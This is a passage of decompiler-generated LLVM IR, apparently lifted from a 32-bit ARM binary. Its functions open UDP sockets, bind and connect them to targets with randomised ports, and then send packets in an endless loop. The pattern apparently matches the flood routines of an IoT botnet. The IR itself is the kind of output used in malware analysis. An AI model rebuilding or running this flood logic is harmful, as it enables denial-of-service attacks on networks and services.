  %v2_8988 = load i8, i8* bitcast (i8** @global_var_1ca7c.21 to i8*), align 4
  %v3_8988 = zext i8 %v2_8988 to i32
  store i32 %v3_8988, i32* %r3.global-to-local, align 4
  %v1_898c = load i32, i32* @r6, align 4
  %v2_898c = inttoptr i32 %v1_898c to i32*
  store i32 %v5_8984, i32* %v2_898c, align 4
  %v0_8990 = load i32, i32* @r5, align 4
  %v2_8990 = load i32, i32* %r3.global-to-local, align 4
  %v5_8990 = mul i32 %v2_8990, 4
  %v6_8990 = add i32 %v5_8990, %v5_8984
  %v7_8990 = inttoptr i32 %v6_8990 to i32*
  store i32 %v0_8990, i32* %v7_8990, align 4
  %v0_8994 = load i32, i32* %r3.global-to-local, align 4
  %v1_8994 = load i32, i32* @r8, align 4
  %v2_8994 = add i32 %v1_8994, %v0_8994
  store i32 %v2_8994, i32* %r2.global-to-local, align 4
  %v1_899c = trunc i32 %v2_8994 to i8
  %v2_899c = load i32, i32* @r4, align 4
  %v3_899c = inttoptr i32 %v2_899c to i8*
  store i8 %v1_899c, i8* %v3_899c, align 1
  %v2_89a0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_89a0, i32* @r4, align 4
  store i32 %v6_8650, i32* @r5, align 4
  store i32 %v9_8650, i32* @r6, align 4
  store i32 %v12_8650, i32* @r7, align 4
  store i32 %v15_8650, i32* @r8, align 4
  ret i32 %v1_8994

; uselistorder directives
  uselistorder i32 %v1_8994, { 1, 0 }
  uselistorder i32 %v1_8948, { 1, 0 }
  uselistorder i32 %v1_88fc, { 1, 0 }
  uselistorder i32 %v1_88b0, { 1, 0 }
  uselistorder i32 %v1_8864, { 1, 0 }
  uselistorder i32 %v1_8818, { 1, 0 }
  uselistorder i32 %v1_87cc, { 1, 0 }
  uselistorder i32 %v1_8780, { 1, 0 }
  uselistorder i32 %v2_8730, { 0, 2, 1 }
  uselistorder i32 %v3_8728, { 1, 0, 2 }
  uselistorder i32 %v1_86e8, { 1, 0 }
  uselistorder i32* @global_var_1ca80.23, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11 }
  uselistorder i8* bitcast (i8** @global_var_1ca7c.21 to i8*), { 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
}

define i32 @function_89d8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_89d8:
  %fp.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-80 = alloca i8, align 1
  %v24_89d8 = load i32, i32* @fp, align 4
  %v1_89dc = urem i32 %arg1, 256
  store i32 %v1_89dc, i32* @r7, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r6, align 4
  %v1_89f4 = urem i32 %arg3, 256
  store i32 %v1_89f4, i32* @r4, align 4
  %v2_89f8 = call i32 @function_126cc(i32 %v1_89dc, i32 4)
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %v2_89f8, i32* @sl, align 4
  %v0_8a04 = load i32, i32* @r7, align 4
  %v2_8a08 = call i32 @function_126cc(i32 %v0_8a04, i32 4)
  store i32 65535, i32* @r5, align 4
  %v0_8a14 = load i32, i32* @r6, align 4
  store i32 %v0_8a14, i32* %r1.global-to-local, align 4
  store i32 %v2_8a08, i32* @sb, align 4
  %v0_8a24 = load i32, i32* @r4, align 4
  %v4_8a28 = inttoptr i32 %v0_8a14 to i32*
  %v5_8a28 = call i32 @function_85e0(i32 %v0_8a24, i32* %v4_8a28, i32 7, i32 65535)
  %v3_8a30 = urem i32 %v5_8a28, 65536
  %v0_8a34 = load i32, i32* @r6, align 4
  store i32 %v0_8a34, i32* %r1.global-to-local, align 4
  %v0_8a3c = load i32, i32* @r5, align 4
  %v0_8a40 = load i32, i32* @r4, align 4
  %v5_8a48 = inttoptr i32 %v0_8a34 to i32*
  %v6_8a48 = call i32 @function_85e0(i32 %v0_8a40, i32* %v5_8a48, i32 6, i32 %v0_8a3c)
  %v0_8a4c = load i32, i32* @r6, align 4
  store i32 %v0_8a4c, i32* %r1.global-to-local, align 4
  %v3_8a50 = mul i32 %v6_8a48, 65536
  store i32 %v3_8a50, i32* %fp.global-to-local, align 4
  %v0_8a5c = load i32, i32* @r4, align 4
  %v4_8a60 = inttoptr i32 %v0_8a4c to i32*
  %v5_8a60 = call i32 @function_85e0(i32 %v0_8a5c, i32* %v4_8a60, i32 0, i32 512)
  %v0_8a6c = load i32, i32* @r6, align 4
  store i32 %v0_8a6c, i32* %r1.global-to-local, align 4
  %v0_8a70 = load i32, i32* @r4, align 4
  %v3_8a78 = urem i32 %v5_8a60, 65536
  store i32 %v3_8a78, i32* @r6, align 4
  %v4_8a7c = inttoptr i32 %v0_8a6c to i32*
  %v5_8a7c = call i32 @function_85e0(i32 %v0_8a70, i32* %v4_8a7c, i32 1, i32 1)
  %v0_8a80 = load i32, i32* %fp.global-to-local, align 4
  %v3_8a80 = udiv i32 %v0_8a80, 65536
  %v1_8a88 = load i32, i32* @r5, align 4
  %v9_8a88 = icmp eq i32 %v3_8a80, %v1_8a88
  store i32 0, i32* %stack_var_-52, align 4
  br i1 %v9_8a88, label %dec_label_pc_8ab0, label %bb

bb:                                               ; preds = %dec_label_pc_89d8
  %v2_8a9c = mul nuw nsw i32 %v3_8a80, 256
  %v4_8aa0 = and i32 %v2_8a9c, 65280
  %v1_8aa4 = urem i32 %v5_8a7c, 256
  store i32 %v1_8aa4, i32* @r8, align 4
  %v5_8aa8 = udiv i32 %v0_8a80, 16777216
  %v6_8aa8 = or i32 %v4_8aa0, %v5_8aa8
  br label %dec_label_pc_8abc

dec_label_pc_8ab0:                                ; preds = %dec_label_pc_89d8
  %v1_8aa47 = urem i32 %v5_8a7c, 256
  store i32 %v1_8aa47, i32* @r8, align 4
  %v0_8ab0 = call i32 @function_e978()
  %v3_8ab8 = urem i32 %v0_8ab0, 65536
  br label %dec_label_pc_8abc

dec_label_pc_8abc:                                ; preds = %bb, %dec_label_pc_8ab0
  %storemerge17 = phi i32 [ %v6_8aa8, %bb ], [ %v3_8ab8, %dec_label_pc_8ab0 ]
  store i32 %storemerge17, i32* %fp.global-to-local, align 4
  %v0_8abc = load i32, i32* @r7, align 4
  %tmp41 = icmp slt i32 %v0_8abc, 1
  br i1 %tmp41, label %dec_label_pc_8c64.preheader, label %dec_label_pc_8ac4

dec_label_pc_8c64.preheader:                      ; preds = %dec_label_pc_8bc0, %dec_label_pc_8abc
  %storemerge3.in12.ph = phi i32 [ %v0_8abc, %dec_label_pc_8abc ], [ %v1_8b18, %dec_label_pc_8bc0 ]
  %tmp424750 = icmp slt i32 %storemerge3.in12.ph, 1
  br i1 %tmp424750, label %dec_label_pc_8c2c, label %dec_label_pc_8c30.lr.ph

dec_label_pc_8ac4:                                ; preds = %dec_label_pc_8abc
  store i32 %v3_8a30, i32* %r1.global-to-local, align 4
  %v3_8ac8 = udiv i32 %v5_8a28, 256
  %v5_8ad4 = trunc i32 %v3_8ac8 to i8
  store i32 %arg2, i32* @r5, align 4
  %v3_8aec = udiv i32 %v5_8a28, 65536
  store i32 %v3_8aec, i32* @r4, align 4
  %v4_8afc = trunc i32 %v3_8aec to i8
  store i8 %v4_8afc, i8* %stack_var_-80, align 1
  %v3_8c0c = icmp eq i32 %v3_8a30, 65535
  %v2_8b34 = ptrtoint i32* %stack_var_-52 to i32
  %v3_8b64 = bitcast i32* %stack_var_-52 to %sockaddr*
  br label %dec_label_pc_8bf0

dec_label_pc_8b04:                                ; preds = %dec_label_pc_8bf0
  %v2_8b04 = load i8, i8* %stack_var_-80, align 1
  %v3_8b04 = sext i8 %v2_8b04 to i32
  store i32 %v3_8b04, i32* %r1.global-to-local, align 4
  store i32 %v3_8ac8, i32* @r4, align 4
  %v2_8b08 = load i32, i32* @r5, align 4
  %v3_8b08 = add i32 %v2_8b08, 2
  %v4_8b08 = inttoptr i32 %v3_8b08 to i8*
  store i8 %v5_8ad4, i8* %v4_8b08, align 1
  %v0_8b0c = load i32, i32* %r1.global-to-local, align 4
  %v1_8b0c = trunc i32 %v0_8b0c to i8
  %v2_8b0c = load i32, i32* @r5, align 4
  %v3_8b0c = add i32 %v2_8b0c, 3
  %v4_8b0c = inttoptr i32 %v3_8b0c to i8*
  store i8 %v1_8b0c, i8* %v4_8b0c, align 1
  br label %dec_label_pc_8b10

dec_label_pc_8b10:                                ; preds = %dec_label_pc_8c18, %dec_label_pc_8b04
  %v1_8b18 = add i32 %stack_var_-56.0, 1
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_8b28 = call i32 @function_123e0(i32 2, i32 2, i32 17)
  store i32 %stack_var_-60.0, i32* @r4, align 4
  %v7_8b30 = icmp eq i32 %v3_8b28, -1
  store i32 %v2_8b34, i32* %r1.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  %v2_8b44 = load i32, i32* @sb, align 4
  %v3_8b44 = add i32 %v2_8b44, %stack_var_-60.0
  %v4_8b44 = inttoptr i32 %v3_8b44 to i32*
  store i32 %v3_8b28, i32* %v4_8b44, align 4
  br i1 %v7_8b30, label %dec_label_pc_8c70, label %dec_label_pc_8b4c

dec_label_pc_8b4c:                                ; preds = %dec_label_pc_8b10
  store i32 2, i32* %stack_var_-52, align 4
  %v4_8b64 = call i32 @function_12210(i32 %v3_8b28, %sockaddr* %v3_8b64, i32 16)
  %v0_8b68 = load i32, i32* @r5, align 4
  %v1_8b68 = add i32 %v0_8b68, 20
  %v2_8b68 = inttoptr i32 %v1_8b68 to i8*
  %v3_8b68 = load i8, i8* %v2_8b68, align 1
  %tmp = icmp ugt i8 %v3_8b68, 31
  br i1 %tmp, label %dec_label_pc_8bc0, label %dec_label_pc_8b74

dec_label_pc_8b74:                                ; preds = %dec_label_pc_8b4c
  %v1_8b74 = add i32 %v0_8b68, 16
  %v2_8b74 = inttoptr i32 %v1_8b74 to i32*
  %v3_8b74 = load i32, i32* %v2_8b74, align 4
  store i32 %v3_8b74, i32* @r4, align 4
  %v0_8b78 = call i32 @function_e978()
  %v0_8b7c = load i32, i32* @r4, align 4
  %v1_8b80 = and i32 %v0_8b7c, 65280
  %v3_8b88 = mul i32 %v0_8b7c, 16777216
  %v4_8b8c = mul nuw nsw i32 %v1_8b80, 256
  %v5_8b8c = or i32 %v4_8b8c, %v3_8b88
  store i32 %v5_8b8c, i32* %r1.global-to-local, align 4
  %v0_8b94 = load i32, i32* @r5, align 4
  %v1_8b94 = add i32 %v0_8b94, 20
  %v2_8b94 = inttoptr i32 %v1_8b94 to i8*
  %v3_8b94 = load i8, i8* %v2_8b94, align 1
  %v4_8b94 = zext i8 %v3_8b94 to i32
  %v2_8b98 = call i32 @llvm.bswap.i32(i32 %v0_8b7c)
  %v7_8b9c = lshr i32 %v0_8b78, %v4_8b94
  %v8_8b9c = add i32 %v7_8b9c, %v2_8b98
  %v3_8ba8 = mul i32 %v8_8b9c, 16777216
  %v1_8bac = and i32 %v8_8b9c, 65280
  %v4_8bb0 = mul nuw nsw i32 %v1_8bac, 256
  %v5_8bb0 = or i32 %v4_8bb0, %v3_8ba8
  store i32 %v5_8bb0, i32* %r1.global-to-local, align 4
  %v2_8bb8 = call i32 @llvm.bswap.i32(i32 %v8_8b9c)
  %v2_8bbc = add i32 %v0_8b94, 4
  %v3_8bbc = inttoptr i32 %v2_8bbc to i32*
  store i32 %v2_8bb8, i32* %v3_8bbc, align 4
  %v0_8bcc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_8bc0

dec_label_pc_8bc0:                                ; preds = %dec_label_pc_8b4c, %dec_label_pc_8b74
  %v0_8bcc = phi i32 [ %v0_8b68, %dec_label_pc_8b4c ], [ %v0_8bcc.pre, %dec_label_pc_8b74 ]
  store i32 %stack_var_-60.0, i32* %r1.global-to-local, align 4
  %v1_8bc8 = load i32, i32* @sb, align 4
  %v2_8bc8 = add i32 %v1_8bc8, %stack_var_-60.0
  %v3_8bc8 = inttoptr i32 %v2_8bc8 to i32*
  %v4_8bc8 = load i32, i32* %v3_8bc8, align 4
  store i32 %v0_8bcc, i32* %r1.global-to-local, align 4
  %v3_8bd0 = inttoptr i32 %v0_8bcc to %sockaddr*
  %v4_8bd0 = call i32 @function_1223c(i32 %v4_8bc8, %sockaddr* %v3_8bd0, i32 16)
  %v1_8bdc = add i32 %stack_var_-60.0, 4
  %v1_8be0 = load i32, i32* @r7, align 4
  %v9_8be0 = icmp eq i32 %v1_8b18, %v1_8be0
  %v0_8be8 = load i32, i32* @r5, align 4
  %v1_8be8 = add i32 %v0_8be8, 24
  store i32 %v1_8be8, i32* @r5, align 4
  br i1 %v9_8be0, label %dec_label_pc_8c64.preheader, label %dec_label_pc_8bf0

dec_label_pc_8bf0:                                ; preds = %dec_label_pc_8bc0, %dec_label_pc_8ac4
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_8ac4 ], [ %v1_8bdc, %dec_label_pc_8bc0 ]
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_8ac4 ], [ %v1_8b18, %dec_label_pc_8bc0 ]
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_8bfc = call i32 @function_126cc(i32 65535, i32 1)
  store i32 %v3_8a30, i32* %r1.global-to-local, align 4
  %v2_8c10 = load i32, i32* @sl, align 4
  %v3_8c10 = add i32 %v2_8c10, %stack_var_-60.0
  %v4_8c10 = inttoptr i32 %v3_8c10 to i32*
  store i32 %v2_8bfc, i32* %v4_8c10, align 4
  br i1 %v3_8c0c, label %dec_label_pc_8c18, label %dec_label_pc_8b04

dec_label_pc_8c18:                                ; preds = %dec_label_pc_8bf0
  %v0_8c18 = call i32 @function_e978()
  %v1_8c18 = trunc i32 %v0_8c18 to i8
  %v4_8c1c = sdiv i32 %v0_8c18, 256
  %v1_8c20 = trunc i32 %v4_8c1c to i8
  %v2_8c20 = load i32, i32* @r5, align 4
  %v3_8c20 = add i32 %v2_8c20, 3
  %v4_8c20 = inttoptr i32 %v3_8c20 to i8*
  store i8 %v1_8c20, i8* %v4_8c20, align 1
  %v3_8c24 = load i32, i32* @r5, align 4
  %v4_8c24 = add i32 %v3_8c24, 2
  %v5_8c24 = inttoptr i32 %v4_8c24 to i8*
  store i8 %v1_8c18, i8* %v5_8c24, align 1
  br label %dec_label_pc_8b10

dec_label_pc_8c2c:                                ; preds = %dec_label_pc_8c64.loopexit, %dec_label_pc_8c64.preheader, %dec_label_pc_8c68.loopexit, %dec_label_pc_8c2c
  br label %dec_label_pc_8c2c

dec_label_pc_8c30:                                ; preds = %dec_label_pc_8c30.lr.ph, %dec_label_pc_8c68.loopexit
  %v0_8c30 = load i32, i32* @r8, align 4
  %v2_8c30 = icmp eq i32 %v0_8c30, 0
  store i32 0, i32* @r5, align 4
  br i1 %v2_8c30, label %dec_label_pc_8c38, label %dec_label_pc_8c78

dec_label_pc_8c38:                                ; preds = %dec_label_pc_8c30
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_8c40

dec_label_pc_8c40:                                ; preds = %dec_label_pc_8c40, %dec_label_pc_8c38
  %v0_8c48 = phi i32 [ %v1_8c48, %dec_label_pc_8c40 ], [ 0, %dec_label_pc_8c38 ]
  %v0_8c40 = phi i32 [ %v1_8c5c, %dec_label_pc_8c40 ], [ 0, %dec_label_pc_8c38 ]
  %v1_8c40 = load i32, i32* @sb, align 4
  %v2_8c40 = add i32 %v1_8c40, %v0_8c40
  %v3_8c40 = inttoptr i32 %v2_8c40 to i32*
  %v4_8c40 = load i32, i32* %v3_8c40, align 4
  %v1_8c44 = load i32, i32* @sl, align 4
  %v2_8c44 = add i32 %v1_8c44, %v0_8c40
  %v3_8c44 = inttoptr i32 %v2_8c44 to i32*
  %v4_8c44 = load i32, i32* %v3_8c44, align 4
  store i32 %v4_8c44, i32* %r1.global-to-local, align 4
  %v1_8c48 = add i32 %v0_8c48, 1
  %v0_8c4c = load i32, i32* @r6, align 4
  %v4_8c54 = inttoptr i32 %v4_8c44 to i32*
  %v5_8c54 = call i32 @function_12350(i32 %v4_8c40, i32* %v4_8c54, i32 %v0_8c4c, i32 16384)
  %v1_8c58 = load i32, i32* @r7, align 4
  %v9_8c58 = icmp eq i32 %v1_8c48, %v1_8c58
  %v0_8c5c = load i32, i32* @r4, align 4
  %v1_8c5c = add i32 %v0_8c5c, 4
  store i32 %v1_8c5c, i32* @r4, align 4
  br i1 %v9_8c58, label %dec_label_pc_8c64.loopexit, label %dec_label_pc_8c40

dec_label_pc_8c64.loopexit:                       ; preds = %dec_label_pc_8c40
  %tmp4247 = icmp slt i32 %v1_8c48, 1
  br i1 %tmp4247, label %dec_label_pc_8c2c, label %dec_label_pc_8c30.lr.ph

dec_label_pc_8c30.lr.ph:                          ; preds = %dec_label_pc_8c64.preheader, %dec_label_pc_8c64.loopexit
  br label %dec_label_pc_8c30

dec_label_pc_8c68.loopexit:                       ; preds = %dec_label_pc_8c80
  %tmp42 = icmp slt i32 %v0_8ca8, 1
  br i1 %tmp42, label %dec_label_pc_8c2c, label %dec_label_pc_8c30

dec_label_pc_8c70:                                ; preds = %dec_label_pc_8b10
  store i32 %v24_89d8, i32* %fp.global-to-local, align 4
  ret i32 %v3_8b28

dec_label_pc_8c78:                                ; preds = %dec_label_pc_8c30
  store i32 0, i32* @fp, align 4
  br label %dec_label_pc_8c80

dec_label_pc_8c80:                                ; preds = %dec_label_pc_8c80, %dec_label_pc_8c78
  %v0_8c80 = phi i32 [ %v1_8cac, %dec_label_pc_8c80 ], [ 0, %dec_label_pc_8c78 ]
  %v1_8c80 = load i32, i32* @sl, align 4
  %v2_8c80 = add i32 %v1_8c80, %v0_8c80
  %v3_8c80 = inttoptr i32 %v2_8c80 to i32*
  %v4_8c80 = load i32, i32* %v3_8c80, align 4
  store i32 %v4_8c80, i32* @r4, align 4
  %v0_8c84 = load i32, i32* @r6, align 4
  store i32 %v0_8c84, i32* @r1, align 4
  %v1_8c8c = inttoptr i32 %v4_8c80 to i8*
  %v2_8c8c = call i32 @function_eaf8(i8* %v1_8c8c)
  %v0_8c90 = load i32, i32* @r5, align 4
  %v1_8c90 = add i32 %v0_8c90, 1
  store i32 %v1_8c90, i32* @r5, align 4
  %v0_8c94 = load i32, i32* @fp, align 4
  %v1_8c94 = load i32, i32* @sb, align 4
  %v2_8c94 = add i32 %v1_8c94, %v0_8c94
  %v3_8c94 = inttoptr i32 %v2_8c94 to i32*
  %v4_8c94 = load i32, i32* %v3_8c94, align 4
  %v0_8c98 = load i32, i32* @r4, align 4
  store i32 %v0_8c98, i32* %r1.global-to-local, align 4
  %v0_8c9c = load i32, i32* @r6, align 4
  %v4_8ca4 = inttoptr i32 %v0_8c98 to i32*
  %v5_8ca4 = call i32 @function_12350(i32 %v4_8c94, i32* %v4_8ca4, i32 %v0_8c9c, i32 16384)
  %v0_8ca8 = load i32, i32* @r5, align 4
  %v1_8ca8 = load i32, i32* @r7, align 4
  %v9_8ca8 = icmp eq i32 %v0_8ca8, %v1_8ca8
  %v0_8cac = load i32, i32* @fp, align 4
  %v1_8cac = add i32 %v0_8cac, 4
  store i32 %v1_8cac, i32* @fp, align 4
  br i1 %v9_8ca8, label %dec_label_pc_8c68.loopexit, label %dec_label_pc_8c80

; uselistorder directives
  uselistorder i32 %v1_8cac, { 1, 0 }
  uselistorder i32 %v0_8ca8, { 1, 0 }
  uselistorder i32 %v1_8c5c, { 1, 0 }
  uselistorder i32 %v1_8c48, { 2, 0, 1 }
  uselistorder i32 %stack_var_-60.0, { 0, 5, 2, 4, 1, 3 }
  uselistorder i32 %v0_8bcc, { 1, 0 }
  uselistorder i32 %v8_8b9c, { 1, 2, 0 }
  uselistorder i32 %v0_8b7c, { 1, 0, 2 }
  uselistorder i32 %v3_8b28, { 1, 3, 2, 0 }
  uselistorder i32 %v1_8b18, { 1, 2, 0 }
  uselistorder i32 %v3_8aec, { 1, 0 }
  uselistorder i32 %v3_8ac8, { 1, 0 }
  uselistorder i32 %v3_8a30, { 0, 2, 1 }
  uselistorder i32 %v1_89dc, { 1, 0 }
  uselistorder i8* %stack_var_-80, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 1, 0, 3, 2 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 11, 12, 3, 4, 5, 6, 7, 8, 9, 10, 13, 14, 16, 15, 17, 19, 18, 0 }
  uselistorder label %dec_label_pc_8c30.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_8c30, { 1, 0 }
  uselistorder label %dec_label_pc_8c2c, { 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_8bc0, { 1, 0 }
  uselistorder label %dec_label_pc_8abc, { 1, 0 }
}

define i32 @function_8cbc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8cbc:
  %fp.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-80 = alloca i8, align 1
  %v24_8cbc = load i32, i32* @fp, align 4
  %v1_8cc0 = urem i32 %arg1, 256
  store i32 %v1_8cc0, i32* @r7, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r6, align 4
  %v1_8cd8 = urem i32 %arg3, 256
  store i32 %v1_8cd8, i32* @r4, align 4
  %v2_8cdc = call i32 @function_126cc(i32 %v1_8cc0, i32 4)
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %v2_8cdc, i32* @sl, align 4
  %v0_8ce8 = load i32, i32* @r7, align 4
  %v2_8cec = call i32 @function_126cc(i32 %v0_8ce8, i32 4)
  store i32 65535, i32* @r5, align 4
  %v0_8cf8 = load i32, i32* @r6, align 4
  store i32 %v0_8cf8, i32* %r1.global-to-local, align 4
  store i32 %v2_8cec, i32* @sb, align 4
  %v0_8d08 = load i32, i32* @r4, align 4
  %v4_8d0c = inttoptr i32 %v0_8cf8 to i32*
  %v5_8d0c = call i32 @function_85e0(i32 %v0_8d08, i32* %v4_8d0c, i32 7, i32 65535)
  %v3_8d14 = urem i32 %v5_8d0c, 65536
  %v0_8d18 = load i32, i32* @r6, align 4
  store i32 %v0_8d18, i32* %r1.global-to-local, align 4
  %v0_8d20 = load i32, i32* @r5, align 4
  %v0_8d24 = load i32, i32* @r4, align 4
  %v5_8d2c = inttoptr i32 %v0_8d18 to i32*
  %v6_8d2c = call i32 @function_85e0(i32 %v0_8d24, i32* %v5_8d2c, i32 6, i32 %v0_8d20)
  %v0_8d30 = load i32, i32* @r6, align 4
  store i32 %v0_8d30, i32* %r1.global-to-local, align 4
  %v3_8d34 = mul i32 %v6_8d2c, 65536
  store i32 %v3_8d34, i32* %fp.global-to-local, align 4
  %v0_8d40 = load i32, i32* @r4, align 4
  %v4_8d44 = inttoptr i32 %v0_8d30 to i32*
  %v5_8d44 = call i32 @function_85e0(i32 %v0_8d40, i32* %v4_8d44, i32 0, i32 1024)
  %v0_8d50 = load i32, i32* @r6, align 4
  store i32 %v0_8d50, i32* %r1.global-to-local, align 4
  %v0_8d54 = load i32, i32* @r4, align 4
  %v3_8d5c = urem i32 %v5_8d44, 65536
  store i32 %v3_8d5c, i32* @r6, align 4
  %v4_8d60 = inttoptr i32 %v0_8d50 to i32*
  %v5_8d60 = call i32 @function_85e0(i32 %v0_8d54, i32* %v4_8d60, i32 1, i32 1)
  %v0_8d64 = load i32, i32* %fp.global-to-local, align 4
  %v3_8d64 = udiv i32 %v0_8d64, 65536
  %v1_8d6c = load i32, i32* @r5, align 4
  %v9_8d6c = icmp eq i32 %v3_8d64, %v1_8d6c
  store i32 0, i32* %stack_var_-52, align 4
  br i1 %v9_8d6c, label %dec_label_pc_8d94, label %bb

bb:                                               ; preds = %dec_label_pc_8cbc
  %v2_8d80 = mul nuw nsw i32 %v3_8d64, 256
  %v4_8d84 = and i32 %v2_8d80, 65280
  %v1_8d88 = urem i32 %v5_8d60, 256
  store i32 %v1_8d88, i32* @r8, align 4
  %v5_8d8c = udiv i32 %v0_8d64, 16777216
  %v6_8d8c = or i32 %v4_8d84, %v5_8d8c
  br label %dec_label_pc_8da0

dec_label_pc_8d94:                                ; preds = %dec_label_pc_8cbc
  %v1_8d887 = urem i32 %v5_8d60, 256
  store i32 %v1_8d887, i32* @r8, align 4
  %v0_8d94 = call i32 @function_e978()
  %v3_8d9c = urem i32 %v0_8d94, 65536
  br label %dec_label_pc_8da0

dec_label_pc_8da0:                                ; preds = %bb, %dec_label_pc_8d94
  %storemerge17 = phi i32 [ %v6_8d8c, %bb ], [ %v3_8d9c, %dec_label_pc_8d94 ]
  store i32 %storemerge17, i32* %fp.global-to-local, align 4
  %v0_8da0 = load i32, i32* @r7, align 4
  %tmp41 = icmp slt i32 %v0_8da0, 1
  br i1 %tmp41, label %dec_label_pc_8f48.preheader, label %dec_label_pc_8da8

dec_label_pc_8f48.preheader:                      ; preds = %dec_label_pc_8ea4, %dec_label_pc_8da0
  %storemerge3.in12.ph = phi i32 [ %v0_8da0, %dec_label_pc_8da0 ], [ %v1_8dfc, %dec_label_pc_8ea4 ]
  %tmp424750 = icmp slt i32 %storemerge3.in12.ph, 1
  br i1 %tmp424750, label %dec_label_pc_8f10, label %dec_label_pc_8f14.lr.ph

dec_label_pc_8da8:                                ; preds = %dec_label_pc_8da0
  store i32 %v3_8d14, i32* %r1.global-to-local, align 4
  %v3_8dac = udiv i32 %v5_8d0c, 256
  %v5_8db8 = trunc i32 %v3_8dac to i8
  store i32 %arg2, i32* @r5, align 4
  %v3_8dd0 = udiv i32 %v5_8d0c, 65536
  store i32 %v3_8dd0, i32* @r4, align 4
  %v4_8de0 = trunc i32 %v3_8dd0 to i8
  store i8 %v4_8de0, i8* %stack_var_-80, align 1
  %v3_8ef0 = icmp eq i32 %v3_8d14, 65535
  %v2_8e18 = ptrtoint i32* %stack_var_-52 to i32
  %v3_8e48 = bitcast i32* %stack_var_-52 to %sockaddr*
  br label %dec_label_pc_8ed4

dec_label_pc_8de8:                                ; preds = %dec_label_pc_8ed4
  %v2_8de8 = load i8, i8* %stack_var_-80, align 1
  %v3_8de8 = sext i8 %v2_8de8 to i32
  store i32 %v3_8de8, i32* %r1.global-to-local, align 4
  store i32 %v3_8dac, i32* @r4, align 4
  %v2_8dec = load i32, i32* @r5, align 4
  %v3_8dec = add i32 %v2_8dec, 2
  %v4_8dec = inttoptr i32 %v3_8dec to i8*
  store i8 %v5_8db8, i8* %v4_8dec, align 1
  %v0_8df0 = load i32, i32* %r1.global-to-local, align 4
  %v1_8df0 = trunc i32 %v0_8df0 to i8
  %v2_8df0 = load i32, i32* @r5, align 4
  %v3_8df0 = add i32 %v2_8df0, 3
  %v4_8df0 = inttoptr i32 %v3_8df0 to i8*
  store i8 %v1_8df0, i8* %v4_8df0, align 1
  br label %dec_label_pc_8df4

dec_label_pc_8df4:                                ; preds = %dec_label_pc_8efc, %dec_label_pc_8de8
  %v1_8dfc = add i32 %stack_var_-56.0, 1
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_8e0c = call i32 @function_123e0(i32 2, i32 2, i32 0)
  store i32 %stack_var_-60.0, i32* @r4, align 4
  %v7_8e14 = icmp eq i32 %v3_8e0c, -1
  store i32 %v2_8e18, i32* %r1.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  %v2_8e28 = load i32, i32* @sb, align 4
  %v3_8e28 = add i32 %v2_8e28, %stack_var_-60.0
  %v4_8e28 = inttoptr i32 %v3_8e28 to i32*
  store i32 %v3_8e0c, i32* %v4_8e28, align 4
  br i1 %v7_8e14, label %dec_label_pc_8f54, label %dec_label_pc_8e30

dec_label_pc_8e30:                                ; preds = %dec_label_pc_8df4
  store i32 2, i32* %stack_var_-52, align 4
  %v4_8e48 = call i32 @function_12210(i32 %v3_8e0c, %sockaddr* %v3_8e48, i32 16)
  %v0_8e4c = load i32, i32* @r5, align 4
  %v1_8e4c = add i32 %v0_8e4c, 20
  %v2_8e4c = inttoptr i32 %v1_8e4c to i8*
  %v3_8e4c = load i8, i8* %v2_8e4c, align 1
  %tmp = icmp ugt i8 %v3_8e4c, 31
  br i1 %tmp, label %dec_label_pc_8ea4, label %dec_label_pc_8e58

dec_label_pc_8e58:                                ; preds = %dec_label_pc_8e30
  %v1_8e58 = add i32 %v0_8e4c, 16
  %v2_8e58 = inttoptr i32 %v1_8e58 to i32*
  %v3_8e58 = load i32, i32* %v2_8e58, align 4
  store i32 %v3_8e58, i32* @r4, align 4
  %v0_8e5c = call i32 @function_e978()
  %v0_8e60 = load i32, i32* @r4, align 4
  %v1_8e64 = and i32 %v0_8e60, 65280
  %v3_8e6c = mul i32 %v0_8e60, 16777216
  %v4_8e70 = mul nuw nsw i32 %v1_8e64, 256
  %v5_8e70 = or i32 %v4_8e70, %v3_8e6c
  store i32 %v5_8e70, i32* %r1.global-to-local, align 4
  %v0_8e78 = load i32, i32* @r5, align 4
  %v1_8e78 = add i32 %v0_8e78, 20
  %v2_8e78 = inttoptr i32 %v1_8e78 to i8*
  %v3_8e78 = load i8, i8* %v2_8e78, align 1
  %v4_8e78 = zext i8 %v3_8e78 to i32
  %v2_8e7c = call i32 @llvm.bswap.i32(i32 %v0_8e60)
  %v7_8e80 = lshr i32 %v0_8e5c, %v4_8e78
  %v8_8e80 = add i32 %v7_8e80, %v2_8e7c
  %v3_8e8c = mul i32 %v8_8e80, 16777216
  %v1_8e90 = and i32 %v8_8e80, 65280
  %v4_8e94 = mul nuw nsw i32 %v1_8e90, 256
  %v5_8e94 = or i32 %v4_8e94, %v3_8e8c
